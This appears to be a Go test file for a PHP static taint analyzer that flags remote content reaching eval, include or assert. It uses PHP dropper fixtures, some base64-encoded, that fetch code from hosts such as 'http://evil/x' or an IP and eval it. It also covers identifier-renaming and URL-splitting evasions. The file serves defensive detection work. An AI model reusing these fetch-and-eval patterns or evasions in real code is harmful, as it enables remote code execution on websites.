package phptaint

import (
	"context"
	"encoding/base64"
	"fmt"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// Fixtures mirror the motivating sample and the two evasions that defeated
// the rejected regex approaches.
var (
	fxMotivating = b64(`<?php
function fetchContent($url) {
    $ch = curl_init($url);
    $data = curl_exec($ch);
    return $data;
}
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)

	fxRenamed = b64(`<?php
function zqx($a) { $b = curl_init($a); $c = curl_exec($b); return $c; }
$q7 = zqx('http://host/p.txt');
eval('?>' . $q7);`)

	fxSplitURL = b64(`<?php
function grab($u) { return file_get_contents($u); }
$h = 'ho' . 'st';
$p = 'http://' . $h . '/payload';
$x = grab($p);
eval($x);`)

	// Each benign fixture below carries one unrelated, non-flowing call from
	// whichever keyword class (source/sink) its scenario otherwise lacks.
	// isCandidate requires both a source and a sink keyword present in the
	// byte stream before parsing runs at all (see TestPrefilterRejectsWithoutBothHalves
	// in prefilter_test.go); a fixture with only one half is StatusNotCandidate,
	// never reaching the deep analysis this test exercises.
	fxBenignLiteral = b64(`<?php
$cache = file_get_contents(__DIR__ . '/cache.json');
$code = 'return 1 + 1;';
eval($code);`)
	fxBenignEcho = b64(`<?php
function fetchContent($url) { return file_get_contents($url); }
$content = fetchContent('http://host/feed.xml');
echo htmlspecialchars($content);
include __DIR__ . '/parts/header.php';`)
	fxBenignInclude = b64(`<?php
$cache = file_get_contents('/etc/local-cache.txt');
$tpl = __DIR__ . '/parts/header.php';
include $tpl;`)
)

func run(t *testing.T, fixture string) Report {
	t.Helper()
	src, err := base64.StdEncoding.DecodeString(fixture)
	if err != nil {
		t.Fatalf("decode fixture: %v", err)
	}
	return Analyze(context.Background(), src)
}

func TestDetectsMotivatingSample(t *testing.T) {
	rep := run(t, fxMotivating)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("no flow reported for the motivating dropper")
	}
	if rep.Results[0].Sink != "eval" {
		t.Errorf("sink = %q, want eval", rep.Results[0].Sink)
	}
}

func TestDetectsRenamedIdentifiers(t *testing.T) {
	if len(run(t, fxRenamed).Results) == 0 {
		t.Fatal("renaming identifiers evaded detection")
	}
}

func TestDetectsSplitURL(t *testing.T) {
	if len(run(t, fxSplitURL).Results) == 0 {
		t.Fatal("splitting the URL across concatenation evaded detection")
	}
}

func TestBenignControlsReportNothing(t *testing.T) {
	for name, fx := range map[string]string{
		"literal": fxBenignLiteral,
		"echo":    fxBenignEcho,
		"include": fxBenignInclude,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Errorf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
			continue
		}
		if len(rep.Results) != 0 {
			t.Errorf("%s: false positive: %+v", name, rep.Results)
		}
	}
}

// TestPropertyWriteDoesNotPoisonUnrelatedSink reproduces the false positive
// the corpus gate found in header-footer-elementor's
// class-bsf-analytics-loader.php: one property ($this->analytics_version)
// is written from remote content, and a DIFFERENT property
// ($this->analytics_path) -- never itself tainted -- reaches require_once
// in the same method. The write and the sink must be in one scope, or
// scope isolation alone would already hide the bug this test targets (see
// TestSinkInsideWrapperAtTopLevelIsDetected for that separate mechanism).
func TestPropertyWriteDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $analytics_version = '';
	private $analytics_path = '';
	function load($h) {
		$raw = curl_exec($h);
		$this->analytics_version = $raw;
		$this->analytics_path = 'safe/local/path.php';
		require_once $this->analytics_path;
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: a write to $this->analytics_version poisoned a read of the unrelated $this->analytics_path: %+v", rep.Results)
	}
}

// TestPropertyWriteStillFlowsToItsOwnSink is the detection-preserving twin
// of the test above: when the SAME property that was written from remote
// content reaches a sink, that must still be reported.
func TestPropertyWriteStillFlowsToItsOwnSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $code = '';
	function load($h) {
		$this->code = curl_exec($h);
		eval($this->code);
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: a property flowing to its own sink was not detected")
	}
}

// TestAssertBooleanArgumentReportsNothing reproduces the second corpus-gate
// false positive, from SimplePie/src/File.php: assert() guarding a
// boolean condition over remotely-sourced content is not a code-execution
// sink on any PHP version this analyzer targets (see the boolean-argument
// sink exclusion covered in taint_test.go and facts_test.go).
func TestAssertBooleanArgumentReportsNothing(t *testing.T) {
	src := b64(`<?php
function fetchInfo($h) {
	$info = curl_exec($h);
	assert(is_array($info) && $info['redirect_count'] >= 0);
	return $info;
}
fetchInfo($handle);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: boolean assert() argument reported as a sink: %+v", rep.Results)
	}
}

// TestAssertStringArgumentStillReportsFlow guards against the
// boolean-argument exclusion overcorrecting into never treating assert as
// a sink: a tainted variable passed directly is still a real PHP 7
// code-execution risk.
func TestAssertStringArgumentStillReportsFlow(t *testing.T) {
	src := b64(`<?php
function fetchCode($h) {
	$code = curl_exec($h);
	assert($code);
}
fetchCode($handle);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: assert($taintedVar) was not detected")
	}
}

// TestArrayOnPropertyWriteDoesNotPoisonUnrelatedSink guards against
// assignedTargetKey unwrapping only property fetches: an array-dim fetch
// sitting OUTERMOST over a property fetch ($this->log[] = ...) must not
// fall through to the bare base-variable over-approximation, which would
// reintroduce a false positive across every other property on the object.
func TestArrayOnPropertyWriteDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $log = array();
	private $path = 'safe/local.php';
	function load($h) {
		$this->log[] = curl_exec($h);
		require_once $this->path;
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: $this->log[] = ... poisoned an unrelated $this->path read: %+v", rep.Results)
	}
}

// TestArrayOnPropertyThroughGenericObjectDoesNotPoisonUnrelatedSink is the
// non-$this variant of the same case: a plain object variable, an
// array-appended property, and an unrelated property reaching a sink at
// the top level.
func TestArrayOnPropertyThroughGenericObjectDoesNotPoisonUnrelatedSink(t *testing.T) {
	src := b64(`<?php
$o->cache['x'] = curl_exec($h);
include $o->tpl;`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: $o->cache['x'] = ... poisoned an unrelated $o->tpl read: %+v", rep.Results)
	}
}

// TestArrayOnPropertyStillFlowsToItsOwnSink is the false-negative guard:
// reading the SAME property back through [] must still be detected, not
// just kept out of unrelated reads.
func TestArrayOnPropertyStillFlowsToItsOwnSink(t *testing.T) {
	src := b64(`<?php
class Loader {
	private $log = array();
	function load($h) {
		$this->log[] = curl_exec($h);
		eval($this->log[0]);
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: $this->log[] flowing to eval($this->log[0]) was not detected")
	}
}

// TestUnresolvableAssignTargetSurfacesInReport covers a control case:
// ($a->b()->c = <tainted>; eval($a->b()->c); is NOT detected -- correctly,
// since a method-call-chain target is not keyed, and dropping is the safe
// direction) must still surface
// "unresolvable-assign-target" in Report.PrecisionLoss, because the dropped
// right-hand side (curl_exec($h)) is genuinely tainted -- the marker fires on
// that, not on the unkeyable target shape alone. Verified through the public
// Analyze entry point, not just in an internal scopeFacts structure.
func TestUnresolvableAssignTargetSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
function f($h) {
	$a = new stdClass();
	$a->b()->c = curl_exec($h);
	eval($a->b()->c);
}
f($handle);`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none: a method-call-chain target is not keyed, so the flow is dropped (safe direction), not detected", rep.Results)
	}
	found := false
	for _, m := range rep.PrecisionLoss {
		if m == "unresolvable-assign-target" {
			found = true
		}
	}
	if !found {
		t.Errorf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceDropSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
Foo::$cache = fetch_remote($handle);
eval('safe literal');`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceDropInFunctionSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function cache_remote($handle) {
	Foo::$cache = fetch_remote($handle);
	eval('safe literal');
}`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceVariableDropInFunctionSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function cache_remote($handle) {
	$payload = fetch_remote($handle);
	Foo::$cache = $payload;
	eval('safe literal');
}`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceSummaryDropSurfacesInReport(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
function fetch_code($handle) {
	return fetch_remote($handle);
}
Foo::$cache = fetch_code($handle);
eval('safe literal');`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("results = %+v, want none for the safe sink", rep.Results)
	}
	if !slices.Contains(rep.PrecisionLoss, "unresolvable-assign-target") {
		t.Fatalf("PrecisionLoss = %v, want unresolvable-assign-target", rep.PrecisionLoss)
	}
}

func TestAliasedSourceFlowsDirectlyToSink(t *testing.T) {
	src := []byte(`<?php
use function curl_exec as fetch_remote;
eval(fetch_remote($handle));`)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 1 || rep.Results[0].Sink != "eval" {
		t.Fatalf("results = %+v, want one eval flow", rep.Results)
	}
}

func TestAliasedAssertInFunctionKeepsArgumentGate(t *testing.T) {
	tests := []struct {
		name        string
		argument    string
		wantResults int
	}{
		{name: "string-capable", argument: "$payload", wantResults: 1},
		{name: "boolean", argument: "$payload !== false", wantResults: 0},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			src := fmt.Sprintf(`<?php
use function assert as check;
function inspect_remote($handle) {
	$payload = curl_exec($handle);
	check(%s);
}`, tc.argument)
			rep := Analyze(context.Background(), []byte(src))
			if rep.Status != StatusAnalyzed {
				t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
			}
			if len(rep.Results) != tc.wantResults {
				t.Fatalf("results = %+v, want %d", rep.Results, tc.wantResults)
			}
		})
	}
}

// TestOrdinaryFileDoesNotReportUnresolvableAssignTarget is the noise guard,
// end to end: a file with only ordinary resolvable assignments (the
// existing motivating-sample fixture) must not carry the marker, or it
// would tell an operator nothing.
func TestOrdinaryFileDoesNotReportUnresolvableAssignTarget(t *testing.T) {
	rep := run(t, fxMotivating)
	for _, m := range rep.PrecisionLoss {
		if m == "unresolvable-assign-target" {
			t.Fatalf("PrecisionLoss = %v, want no unresolvable-assign-target for an ordinary file", rep.PrecisionLoss)
		}
	}
}

func TestFunctionLocalDoesNotTaintTopLevelSameName(t *testing.T) {
	// A function-local variable must not taint an unrelated top-level
	// variable that merely shares its name.
	src := b64(`<?php
function fetch($c) { $tmp = curl_exec($c); return $tmp; }
$tmp = 'safe literal';
eval($tmp);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	for _, r := range rep.Results {
		if r.Sink == "eval" {
			t.Fatalf("false positive: clean top-level $tmp reported as %+v", r)
		}
	}
}

// TestConditionalFunctionDeclarationDoesNotLeak is the real WordPress
// idiom: guarding a function declaration with function_exists so a plugin
// can be included more than once. The declaration is not a direct
// top-level statement -- it is wrapped in an if -- so a filter keyed on
// the direct statement type at the top of a scope would miss it and let
// the inner $content taint the unrelated top-level $content.
func TestConditionalFunctionDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! function_exists( 'theme_fetch' ) ) {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestConditionalClassDeclarationDoesNotLeak is the class_exists sibling of
// the function_exists guard: a class (and its method) declared inside an
// if must not leak the method's local into an identically-named top-level
// variable either.
func TestConditionalClassDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! class_exists( 'Theme_Fetcher' ) ) {
	class Theme_Fetcher {
		function fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestTryWrappedDeclarationDoesNotLeak checks a different wrapper (try) to
// confirm the fix is not a special case for if: the library traverser
// recurses through every control-flow construct the same way, so the
// exclusion must be wrapper-agnostic.
func TestTryWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
try {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
} catch ( Throwable $e ) {
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestDoublyWrappedDeclarationDoesNotLeak nests a declaration two wrappers
// deep. Exclusion is position-based, not keyed to any particular wrapper
// depth, so this must hold regardless of how many layers separate the
// declaration from the top level.
func TestDoublyWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( true ) {
	foreach ( array( 1 ) as $i ) {
		function theme_fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestSinkInsideWrapperAtTopLevelIsDetected is the false-negative guard: a
// sink that genuinely belongs to the top-level scope, merely sitting
// inside an if, must still be detected. Excluding a declaration's own span
// must never over-narrow into excluding ordinary control flow that isn't a
// declaration at all.
func TestSinkInsideWrapperAtTopLevelIsDetected(t *testing.T) {
	src := b64(`<?php
$tainted = curl_exec($h);
if ($tainted) {
	eval($tainted);
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: sink genuinely at top level, wrapped in if, was not detected")
	}
}

// TestAnonymousClassMethodDoesNotLeak closes the same leak for an anonymous
// class assigned to a top-level variable. Its method is not a direct
// top-level statement either -- it is nested inside an ExprNew inside an
// assignment -- so this is covered by the same position-based exclusion as
// the named-declaration cases above, with no special case required.
func TestAnonymousClassMethodDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$obj = new class {
	function get( $c ) {
		$tmp = curl_exec( $c );
		return $tmp;
	}
};
$tmp = 'safe literal';
eval( $tmp );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureParameterShadowDoesNotLeak is the closure sibling of the
// function-parameter case: a closure parameter sharing the outer tainted
// variable's name must not inherit that taint, because the closure body is
// its own scope now, exactly like a named function's body already is.
func TestClosureParameterShadowDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$data = file_get_contents('http://evil/x');
add_action('init', function ($data) { eval($data); });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureLocalReassignmentDoesNotLeak is the damaging false positive: no
// remote value reaches the sink at all. Without the closure's body being its
// own scope, the flow-insensitive fixpoint over one flat scope sees both the
// outer remote assignment and the closure's own local literal reassignment
// to the identically-named variable, and taints it regardless of order.
func TestClosureLocalReassignmentDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$tpl = file_get_contents('http://evil/x');
register_shutdown_function(function () { $tpl = __DIR__ . '/local.php'; include $tpl; });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestArrowFunctionParameterShadowDoesNotLeak is the arrow-function sibling
// of TestClosureParameterShadowDoesNotLeak. An arrow function's body is a
// single expression rather than a statement list, so this also exercises
// that the exclusion and per-scope analysis mechanism handles that shape.
func TestArrowFunctionParameterShadowDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$code = file_get_contents('https://evil/x');
$f = fn($code) => eval($code);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestClosureFlowStillDetected is the false-negative guard for
// TestClosureParameterShadowDoesNotLeak and TestClosureLocalReassignmentDoesNotLeak:
// a genuine fetch-to-sink flow entirely inside a closure body must still be
// found once that body is analysed as its own scope, the same way a flow
// entirely inside a named function's body already is.
func TestClosureFlowStillDetected(t *testing.T) {
	src := b64(`<?php
add_action('init', function ($u) { $c = curl_exec($u); eval($c); });`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: genuine flow inside a closure was not detected")
	}
}

// TestArrowFunctionFlowStillDetected is the arrow-function sibling of
// TestClosureFlowStillDetected: a genuine flow entirely inside an arrow
// function's single-expression body must still be found.
func TestArrowFunctionFlowStillDetected(t *testing.T) {
	src := b64(`<?php
$f = fn($u) => eval(curl_exec($u));`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: genuine flow inside an arrow function was not detected")
	}
}

// TestClosureInsideFunctionInsideWrapperDoesNotLeak composes the closure
// exclusion with the existing wrapper and function exclusions: a closure
// nested inside a function, itself nested inside a control-flow wrapper,
// must not let its own local leak into the identically-named local of the
// function that declares it.
func TestClosureInsideFunctionInsideWrapperDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( true ) {
	function outer( $h ) {
		$tmp = 'safe literal';
		register_shutdown_function( function () use ( $h ) {
			$tmp = curl_exec( $h );
		} );
		eval( $tmp );
	}
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// manyDeclSource builds n trivial class declarations followed by one
// genuine curl_exec-to-eval flow, so a test can tell "this analyzed
// correctly at scale" apart from "this merely returned quickly because
// nothing was found."
func manyDeclSource(n int) []byte {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "class decl%d{}\n", i)
	}
	src.WriteString("$d = curl_exec($h);\neval($d);\n")
	return []byte(src.String())
}

func summaryLimitSource() []byte {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < maxSummarizedFuncs; i++ {
		fmt.Fprintf(&src, "function summary%d(){}\n", i)
	}
	src.WriteString("function over_limit($h){return curl_exec($h);}\n")
	src.WriteString("$d = over_limit($h); eval($d);\n")
	return []byte(src.String())
}

type cancelOnErrCheck struct {
	context.Context
	cancel    context.CancelFunc
	remaining atomic.Int32
}

func newCancelOnErrCheck(check int32) *cancelOnErrCheck {
	ctx, cancel := context.WithCancel(context.Background())
	out := &cancelOnErrCheck{Context: ctx, cancel: cancel}
	out.remaining.Store(check)
	return out
}

func (c *cancelOnErrCheck) Err() error {
	if c.remaining.Add(-1) == 0 {
		c.cancel()
	}
	return c.Context.Err()
}

// TestManyDeclarationsStillAnalyzeCorrectly is a correctness check at
// scale, not a performance guard: the genuine flow appended after 15,000
// declarations must still be found, which only happens if every
// declaration's own exclusion index was built correctly. (An earlier
// version of this test tried to double as a performance regression guard
// by relying on go test's default timeout as an implicit backstop. That
// was not reliable -- see TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount's
// comment for why -- so this test now only asserts what it can actually
// guarantee.)
func TestManyDeclarationsStillAnalyzeCorrectly(t *testing.T) {
	rep := Analyze(context.Background(), manyDeclSource(15_000))
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("genuine flow after 15,000 declarations was not detected")
	}
}

// TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount asserts the
// structural performance invariant directly. analyze and functionSummaries
// share one scopeFacts, so its declaration tree must be built exactly once
// regardless of declaration count. The counter observes builds without
// making the assertion depend on machine speed or CI load.
func TestDeclarationTreeBuildCountIsIndependentOfDeclarationCount(t *testing.T) {
	buildsFor := func(n int) int64 {
		before := declTreeBuilds.Load()
		rep := Analyze(context.Background(), manyDeclSource(n))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s) for %d declarations", rep.Status, rep.Reason, n)
		}
		return declTreeBuilds.Load() - before
	}

	small := buildsFor(1_000)
	large := buildsFor(10_000)

	if small != 1 || large != 1 {
		t.Fatalf("build count = %d at 1,000 declarations and %d at 10,000, want exactly one per analysis", small, large)
	}
}

func TestSummaryLimitReportsCoverageGap(t *testing.T) {
	rep := Analyze(context.Background(), summaryLimitSource())
	if rep.Status != StatusResourceLimit {
		t.Fatalf("status = %v, want StatusResourceLimit past %d summaries", rep.Status, maxSummarizedFuncs)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a coverage-gap status", rep.Results)
	}
}

func TestAnalyzeChecksContextAfterDeclarationIndex(t *testing.T) {
	ctx := newCancelOnErrCheck(4)
	t.Cleanup(ctx.cancel)

	rep := Analyze(ctx, manyDeclSource(1_000))
	if rep.Status != StatusCanceled {
		t.Fatalf("status = %v, want StatusCanceled", rep.Status)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a canceled analysis", rep.Results)
	}
}

func TestAnalyzeReportsPreboundedEvidenceTruncation(t *testing.T) {
	t.Run("source label", func(t *testing.T) {
		name := strings.Repeat("fetch", maxSegmentBytes)
		src := fmt.Sprintf("<?php function %s(){return curl_exec($h);} eval(%s());", name, name)
		rep := Analyze(context.Background(), []byte(src))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
		}
		if len(rep.Results) != 1 {
			t.Fatalf("results = %+v, want one flow", rep.Results)
		}
		if !rep.EvidenceTruncated {
			t.Fatal("EvidenceTruncated = false for a shortened source label")
		}
		if len(rep.Results[0].Source) > maxSegmentBytes {
			t.Fatalf("source length = %d, want at most %d", len(rep.Results[0].Source), maxSegmentBytes)
		}
	})

	t.Run("identifiers", func(t *testing.T) {
		// Identifiers lists every name in the sink expression, not just the
		// ones that carried taint -- these $cleanN variables never carry
		// $tainted's value, but they still count toward the truncation cap.
		var src strings.Builder
		src.WriteString("<?php $tainted = curl_exec($h); eval($tainted")
		for i := 0; i < maxChainSegments; i++ {
			fmt.Fprintf(&src, " . $clean%d", i)
		}
		src.WriteString(");")

		rep := Analyze(context.Background(), []byte(src.String()))
		if rep.Status != StatusAnalyzed {
			t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
		}
		if len(rep.Results) != 1 {
			t.Fatalf("results = %+v, want one flow", rep.Results)
		}
		if !rep.EvidenceTruncated {
			t.Fatal("EvidenceTruncated = false for a shortened identifiers list")
		}
		if len(rep.Results[0].Identifiers) != maxChainSegments {
			t.Fatalf("identifiers length = %d, want %d", len(rep.Results[0].Identifiers), maxChainSegments)
		}
	})
}

// TestDeclarationLimitReportsCoverageGap confirms the defence-in-depth cap
// fires as a coverage gap, never a silent skip: a file whose declaration
// count exceeds maxDeclarations must report StatusResourceLimit -- meaning
// the file was NOT examined -- rather than StatusAnalyzed with an
// incomplete (and therefore falsely "clean") result.
func TestDeclarationLimitReportsCoverageGap(t *testing.T) {
	src := manyDeclSource(maxDeclarations + 1)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusResourceLimit {
		t.Fatalf("status = %v, want StatusResourceLimit for %d declarations", rep.Status, maxDeclarations+1)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a coverage-gap status", rep.Results)
	}
}

func TestResultsAreDeterministic(t *testing.T) {
	first := run(t, fxMotivating)
	for i := 0; i < 5; i++ {
		again := run(t, fxMotivating)
		if len(again.Results) != len(first.Results) {
			t.Fatalf("run %d: result count changed", i)
		}
		for j := range first.Results {
			// Result.Identifiers is a []string, so Result is not comparable with !=;
			// reflect.DeepEqual preserves the same byte-identical intent.
			if !reflect.DeepEqual(again.Results[j], first.Results[j]) {
				t.Fatalf("run %d result %d differs", i, j)
			}
		}
	}
}

var (
	fxCaptureTainted = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function() use ($payload) { eval($payload); });`)

	fxCaptureTaintedArrow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', fn() => eval($payload));`)

	// The local include is a sink that no tainted value reaches. Without a
	// sink the pre-filter rejects the file outright and the analyzed path
	// this test is about never runs.
	fxCaptureClean = b64(`<?php
$payload = 'local literal';
$unused = curl_exec($c);
include __DIR__ . '/parts/header.php';
add_action('init', function() use ($payload) { echo $payload; });`)

	fxCaptureParamShadow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function($payload) { include $payload; });`)

	fxCaptureThenReassign = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
add_action('init', function() use ($payload) { $payload = 'safe.php'; include $payload; });`)

	fxCaptureThroughArrow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$factory = fn() => function() use ($payload) { eval($payload); };`)

	fxCaptureThroughNestedArrow = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$factory = fn() => fn() => eval($payload);`)

	fxFunctionCaptureThroughArrow = b64(`<?php
function make_handler() {
    $payload = file_get_contents('http://198.51.100.7/x');
    return fn() => function() use ($payload) { eval($payload); };
}`)

	fxCaptureBlockedByArrowParam = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$factory = fn($payload) => function() use ($payload) { include $payload; };`)

	fxCaptureBlockedByClosure = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
$factory = function() { return fn() => include $payload; };`)

	fxCaptureBlockedByFunction = b64(`<?php
$payload = file_get_contents('http://198.51.100.7/x');
function make_handler() { return fn() => eval($payload); }`)
)

// TestClosureCaptureOfTaintedValueIsRecorded pins the package's own contract:
// scoping a closure's body keeps an unrelated same-named outer variable from
// firing on clean code, but it also means a value the closure genuinely does
// receive through use() stops being tracked at the boundary. That is a real
// reduction in coverage, and this package treats an unrecorded reduction as a
// silent false negative rather than an acceptable trade.
